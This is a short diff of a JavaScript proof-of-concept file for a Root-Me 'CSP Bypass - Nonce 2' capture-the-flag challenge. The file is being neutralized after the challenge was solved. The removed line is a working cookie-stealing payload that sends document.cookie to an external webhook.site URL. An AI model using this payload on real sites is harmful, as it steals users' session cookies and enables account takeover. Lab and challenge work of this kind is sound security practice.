@@ -1,1 +1,3 @@
-document.location='//webhook.site/e8ef4fb1-48c0-41d8-a480-e1ed171df086/?c='+document.cookie;
+// This exploit PoC file for Root-Me challenge "CSP Bypass - Nonce 2" (ch62)
+// has been neutralized after the challenge was solved and validated.
+console.log("neutralized");
